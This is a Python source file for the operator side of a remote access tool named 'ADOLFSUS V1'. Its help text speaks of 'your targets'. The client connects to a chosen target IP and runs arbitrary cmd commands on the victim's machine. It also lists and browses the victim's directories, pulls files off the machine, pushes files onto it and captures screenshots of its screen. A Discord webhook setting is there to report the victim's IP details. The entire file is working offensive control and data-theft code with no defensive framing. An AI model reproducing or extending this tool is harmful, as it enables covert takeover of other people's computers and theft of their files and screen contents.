import socket
import os
import time
from datetime import datetime

HOST = str
PORT = 8080
Break = True
connected = False
            

def connection(HOST,PORT,conn):
    match conn:
        case 0:
            print("\u001b[37mNo Connection","_._._._",":","_._._._\u001b[37m","\u001b[31m●\u001b[31m")
        case 1:
            print("\u001b[37mConnection",HOST,":",PORT,"\u001b[32m●\u001b[32m")
        case 2:
            print("\u001b[37mConnection",HOST,":",PORT,"\u001b[31m●\u001b[31m")

    
    
    
    
def command_option(command,case,HOST,PORT):
    match command:
        case 'clear': #basicly clears screen nothing much to see here (:D)
            os.system("cls")
            print("""\033[33m

 █████╗ ██████╗  ██████╗ ██╗     ███████╗███████╗██╗   ██╗███████╗    ██╗   ██╗ ██╗    
██╔══██╗██╔══██╗██╔═══██╗██║     ██╔════╝██╔════╝██║   ██║██╔════╝    ██║   ██║███║    
███████║██║  ██║██║   ██║██║     █████╗  ███████╗██║   ██║███████╗    ██║   ██║╚██║    
██╔══██║██║  ██║██║   ██║██║     ██╔══╝  ╚════██║██║   ██║╚════██║    ╚██╗ ██╔╝ ██║    
██║  ██║██████╔╝╚██████╔╝███████╗██║     ███████║╚██████╔╝███████║     ╚████╔╝  ██║    
╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚══════╝      ╚═══╝   ╚═╝    
                                                                                       
            -Tip: Write 'help' to start your journey (¬‿¬ )*:･ﾟ✧
            -Tip: For cmd commands include '$'   
            -Tip: cmd commands that are wrong crash the server                                                                                                                                                            
\033[33m""")
            connection(HOST,PORT,case)
            
            
        case 'goto_dir':
            S.sendall(command.encode())
            dir_name = input("\033[35mCustom directory: ")
            S.sendall(dir_name.encode())
            files = S.recv(4096)
            files = files.decode()
            print("\033[35mCustom directory result: ", files)
        
        case 'dir_files':
            S.sendall(command.encode())
            dir_name = input("\033[35mFolder directory: ")
            S.sendall(dir_name.encode())
            files = S.recv(4096)
            files = files.decode()
            print("\033[35mFiles result: ", files)
            
            
        case 'webhook':
            action = input('\033[35mDo you want to use a webhook[Y/N]?: ')
            file = open('settings.txt','r')
            read = file.readlines()
            file.close()
            
            
            
            if action == 'Y':
                webhook_dummy = input('\033[35mInput webhook url: ')
                read[0] = 'true\n'
                read[1] = webhook_dummy + '\n' # index 0 will be for webhook
    
                new_file = open('settings.txt','w+') 
                for line in read:
                    new_file.write(line)
                new_file.close()
                
            elif action == 'N':
                read[0] = 'false\n'
                new_file = open('settings.txt','w+')
                for line in read:
                    new_file.write(line)
                new_file.close()
                
        case 'send_webhook':
            file = open('settings.txt','r')
            modified_list = [read.rstrip() for read in open('settings.txt')]
            file.close()
            S.sendall(modified_list[0].encode())
            if(modified_list[0] == 'true'):
                webhook_from_settings = modified_list[1]
                S.sendall(webhook_from_settings.encode())   
        
        
        case 'download_file':
            S.sendall(command.encode())
            filepath = input("\033[35mFile path(PROVIDE FILE EXTENSION): ")
            S.sendall(filepath.encode())
            file = S.recv(1000000)
            filename = input("\033[35mSave file as(PROVIDE FILE EXTENSION): ")
            new_file = open(filename,"wb")
            new_file.write(file)
            new_file.close()
            print(filename,"\033[35m has been succesfully downloaded ٩(◕‿◕｡)۶")
        
        case 'inject_file':
            S.sendall(command.encode())
            file = input("\033[35mFile path:")
            filename = input("\033[35mSend file as: ")
            data = open(file,"rb")
            file_data = data.read(1000000)
            S.sendall(filename.encode())
            S.sendall(file_data)
            print("\033[35mYou have succsesfully injected the file (ﾉ◕ヮ◕)ﾉ*:･ﾟ✧")
            
        case 'help':
            print('\u001b[37mInstructions:\n')
            print('\u001b[35mYou can either input and execute a cmd command directly into your targets prompt\n or you can use on of the special commands listed below: \n') 
            print('\u001b[37mSpecial Commands:\n')
            
            print('\u001b[36m[1] goto_dir                     [2] dir_files\n')
            print('[3] download_file                [4] inject_file\n')
            print('[5] clear                        [6] webhook\n')
            print('[7] Exit                         [8] screenshot\n')
             
            
            option = input('\u001b[33mIf you wanna know more about each command type its respected number.To exit the help menu type exit: ')
            while option != 'exit':
                if option == '1':
                    print('\u001b[36m[+]This command is used to go to a custom directory. For example after execution the prompt will ask you for a path. An example for that would be C:\\ (which goes to C drive)')
                    option = input('\u001b[33mIf you wanna know more about each command type its respected number.To exit the help menu type exit: ')
                elif option == '2':
                    print('\u001b[36m[+]This command lists all the files in a custom directory. For example after execution the prompt will ask you for a path. An example for that would be C:\\ (which will give you all the files in C drive)')
                    option = input('\u001b[33mIf you wanna know more about each command type its respected number.To exit the help menu type exit: ')        
                elif option == '3':
                    print('\u001b[36m[+]This command is used to download files from your targets machine by providing the path to that file. ')
                    option = input('\u001b[33mIf you wanna know more about each command type its respected number.To exit the help menu type exit: ')
                elif option == '4':
                    print('\u001b[36m[+]This command downloads a file specified by you on the targets machine in a custom directory.')
                    option = input('\u001b[33mIf you wanna know more about each command type its respected number.To exit the help menu type exit: ')
                elif option == '5':
                    print('\u001b[36m[+]Clears screen dummy	♡(｡- ω -)')
                    option = input('\u001b[33mIf you wanna know more about each command type its respected number.To exit the help menu type exit: ')
                elif option == '6':
                    print('\u001b[36m[+]This sets a webhook for a discord server. There you will be sent screenshots if i figure that out and ip details')
                    option = input('\u001b[33mIf you wanna know more about each command type its respected number.To exit the help menu type exit: ')
                elif option == '7':
                    print('\u001b[36m[+] You didnt actually figure this out lmao ( ͡° ͜ʖ ͡°) . Exits the app')
                    option = input('\u001b[33mIf you wanna know more about each command type its respected number.To exit the help menu type exit: ')
                elif option =='8':
                    print('\u001b[36m[+] Takes a screenshot of the targets screen')
                    option = input('\u001b[33mIf you wanna know more about each command type its respected number.To exit the help menu type exit: ')

                else:
                    option = input('\u001b[33mIf you wanna know more about each command type its respected number.To exit the help menu type exit: ')
        case 'screenshot':
            S.sendall(command.encode())
            file = S.recv(10000000)
            filename1 = datetime.now().strftime("%Y%m%d-%H%M%S")
            filename1 += '.png'
            filepath = r"\\screenshots\\"
            
            new_file = open(filename1,"wb")
            new_file.write(file)
            new_file.close()
            print("Screenshot saved")

            
            
                    
        case 'Exit': 
            print('\u001b[33mWhy do you have to go so early (◞‸◟；)')           
            t=3
            
            while t:
                mins, secs = divmod(t, 60)
                timer = '{:02d}:{:02d}'.format(mins, secs)
                print(timer,end="\r")
                time.sleep(1)
                t -= 1
            
            
             
                
        case _: #default case is set to commands
            if command[0] == '$': 
                S.sendall(str.encode(command[1:]))
                data = S.recv(2048)
                print("\033[35mRecived data: ",data.decode())
            else:
                print("\033[33mThis command was not found (´･ω･`)?. For cmd commands try putting an '$' infront of the command. Example: '$dir'")
            
             
            
        
            




with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as S:
    while not connected: 
        command_option('clear',0,0,0)
        HOST = input("\033[33mEnter target IP adress: ")
        try:
            S.connect((HOST, PORT))
            connected = True
            command_option('clear',1,HOST,PORT)
        except socket.error:
            time.sleep(0.2)
    
    
    command_option('send_webhook',0,0,0)
    
    while Break:
        msg = input("\033[32mYour command: \033[32m")
        command_option(msg,1,HOST,PORT)
        if msg == 'Exit':
          Break = False  
        #S.sendall(str.encode(msg))
        
        